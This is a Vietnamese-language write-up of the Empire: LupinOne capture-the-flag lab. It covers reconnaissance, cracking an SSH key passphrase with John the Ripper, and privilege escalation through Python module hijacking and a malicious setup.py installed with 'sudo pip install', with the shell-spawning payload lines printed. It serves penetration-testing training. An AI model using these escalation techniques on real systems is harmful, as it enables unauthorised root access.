# SECURITY ASSESSMENT REPORT - Empire: LupinOne

## 1. Reconnaissance

### 1.1. Port Scanning

Trước tiên, sử dụng `nmap` để quét các cổng đang mở trên máy chủ mục tiêu:

```bash
nmap -p- -sC -sV <TARGET>
```

![img](img/nmap.png?raw=true)

Kết quả cho thấy có hai cổng đang mở:

* `22/tcp` – SSH
* `80/tcp` – HTTP

Tiến hành truy cập web server thông qua cổng 80 để kiểm tra ứng dụng web.

![img](img/port80.png?raw=true)

---

## 2. Web Enumeration

### 2.1. Directory Enumeration

Tiếp theo sử dụng `Gobuster` để tìm kiếm các directory và file có thể truy cập:

```bash
gobuster dir -u http://<TARGET>/ -w /usr/share/dirb/wordlists/common.txt
```

![img](img/gobuster.png?raw=true)

Hai đường dẫn đáng chú ý được phát hiện là:

```text
/manual
/robots.txt
```

Tiến hành kiểm tra `robots.txt`:

```text
User-agent: *
Disallow: /~myfiles
```

Nội dung này cho thấy server đang yêu cầu crawler không truy cập `/~myfiles`. Tuy nhiên, `robots.txt` không phải cơ chế kiểm soát truy cập, do đó vẫn có thể thử truy cập trực tiếp endpoint này.

Khi truy cập `/~myfiles`, server trả về lỗi `404 Not Found`.

![img](img/404.png?raw=true)

Tuy nhiên, ký tự `~` trong `/~myfiles` có thể là một dấu hiệu liên quan đến cách đặt tên thư mục hoặc file của web server. Vì vậy, tiếp tục kiểm tra các đường dẫn có sử dụng ký tự này.

---

## 3. Apache Manual Enumeration

Truy cập `/manual` cho thấy đây là trang Apache Manual.

![img](img/manual.png?raw=true)

Tiếp tục sử dụng Gobuster trên `/manual` để tìm kiếm các resource ẩn:

```bash
gobuster dir -u http://<TARGET>/manual/ -w /usr/share/dirb/wordlists/common.txt
```

![img](img/gobustermanual.png?raw=true)

Kết quả không phát hiện thêm đường dẫn đáng chú ý.

---

## 4. Fuzzing với ký tự `~`

Do `/~myfiles` và ký tự `~` xuất hiện trong `robots.txt`, tiến hành fuzz các đường dẫn bắt đầu bằng ký tự này.

![img](img/fuzz.png?raw=true)

Kết quả phát hiện một endpoint đáng chú ý:

```text
/~secret
```

Tiến hành truy cập endpoint này.

![img](img/secret.png?raw=true)

Nội dung trang cung cấp một số gợi ý liên quan đến việc tìm kiếm **SSH private key** và sử dụng wordlist `fasttrack` để crack key.

Ngoài ra, dòng:

```text
Your best friend icex64
```

có thể là một gợi ý về username được sử dụng trên hệ thống:

```text
icex64
```

Do đó, hướng khai thác tiếp theo là tìm SSH private key và xác định passphrase của key.

---

## 5. Hidden SSH Private Key

SSH private key có thể được lưu dưới dạng file ẩn. Vì vậy, tiếp tục fuzz với dấu `.` đứng trước tên file.

![img](img/fuzz2.png?raw=true)

Kết quả phát hiện một file `.txt` đáng chú ý.

Tiến hành truy cập file này:

![img](img/mysecret.png?raw=true)

Nội dung thu được là một chuỗi được mã hóa dưới dạng **Base58**.

Tiến hành decode chuỗi bằng CyberChef:

![img](img/cyberchef.png?raw=true)

Kết quả decode là một **SSH private key**.

---

## 6. SSH Key Cracking

Lưu private key vào một file riêng, sau đó sử dụng `ssh2john` để chuyển private key sang định dạng hash mà John the Ripper có thể xử lý:

```bash
ssh2john key > hash.txt
```

Sau đó sử dụng John the Ripper cùng wordlist `fasttrack` để tìm passphrase của SSH private key:

```bash
john hash.txt --wordlist=/usr/share/wordlists/fasttrack.txt
```

![img](img/john.png?raw=true)

Kết quả thu được passphrase của private key.

---

## 7. Initial Access – SSH

Sau khi có passphrase, sử dụng private key để SSH vào máy chủ với username được suy ra từ gợi ý trước đó:

```text
icex64
```

![img](img/ssh_and_user_flag.png?raw=true)

Đã đăng nhập thành công vào hệ thống với tài khoản `icex64` và thu được user flag.

---

# 8. Privilege Escalation – icex64 → arsene

Sau khi đăng nhập, sử dụng `sudo -l` để kiểm tra các command mà user hiện tại có thể thực thi với quyền cao hơn:

```bash
sudo -l
```

![img](img/sudo%20-l.png?raw=true)

Kết quả cho thấy user hiện tại có thể thực thi Python 3.9 cùng với file:

```text
heist.py
```

mà không yêu cầu nhập password.

Tiến hành kiểm tra nội dung và cấu trúc của `heist.py`:

![img](img/arsense.png?raw=true)

File `heist.py` sử dụng module `webbrowser`. Do Python tìm kiếm module trong các thư mục nhất định, có thể lợi dụng cơ chế import module để thay thế module được sử dụng bằng một phiên bản do attacker kiểm soát.

Tiến hành tạo/chỉnh sửa module `webbrowser` để thực thi command:

```python
os.system("/bin/bash")
```

Sau đó chạy `heist.py` thông qua Python 3.9 với `sudo`.

Kết quả là shell được thực thi với quyền của user `arsene`.

![img](img/userarsense.png?raw=true)

---

# 9. Privilege Escalation – arsene → root

Sau khi chuyển sang user `arsene`, tiếp tục kiểm tra quyền sudo:

```bash
sudo -l
```

![img](img/sudo%20-l%20arsense.png?raw=true)

Kết quả cho thấy `arsene` có thể thực thi:

```text
/usr/bin/pip
```

với quyền `root` mà không yêu cầu password.

Đây là một cấu hình nguy hiểm vì `pip` có khả năng cài đặt Python package và trong quá trình cài đặt có thể thực thi code từ `setup.py`.

---

# 10. Exploiting pip

Tra cứu kỹ thuật khai thác `pip` để privilege escalation:

![img](img/GTFO.png?raw=true)

Cơ chế khai thác dựa trên việc `pip install` có thể xử lý file `setup.py` của package.

Khi `pip` cài đặt một package local, `setup.py` có thể được thực thi. Nếu toàn bộ quá trình `pip install` được chạy với quyền `root`, code trong `setup.py` cũng có thể được thực thi với quyền root.

Do đó có thể tạo một package Python đơn giản chứa payload trong `setup.py`:

```python
import os; 
os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')
```

---

# 11. Root Access

Tạo một thư mục tạm trong `/tmp`, đặt file `setup.py` chứa code thực thi command vào thư mục này, sau đó sử dụng `sudo pip install` để cài đặt package. Sau khi `pip` xử lý package, code trong `setup.py` được thực thi và shell được cấp quyền `root`.

Kiểm tra quyền hiện tại:

```bash
id
```

Kết quả:

```text
root
```

Như vậy đã hoàn thành quá trình privilege escalation từ `arsene` lên `root`.

Sau đó truy cập thư mục `/root` và đọc `root.txt` để hoàn thành bài.

![img](img/root.png?raw=true)

---

# 12. Attack Chain

Toàn bộ quá trình khai thác có thể được tóm tắt như sau:

```text
Nmap
  ↓
Port 22 / 80
  ↓
Gobuster
  ↓
/robots.txt
  ↓
/~myfiles
  ↓
Fuzz với "~"
  ↓
/~secret
  ↓
SSH Private Key
  ↓
Base58 Decode
  ↓
ssh2john
  ↓
John + Fasttrack
  ↓
SSH as icex64
  ↓
User Flag
  ↓
sudo -l
  ↓
Python 3.9 + heist.py
  ↓
Python Module Hijacking
  ↓
arsene
  ↓
sudo -l
  ↓
pip as root
  ↓
Malicious setup.py
  ↓
Root
  ↓
Root Flag
```
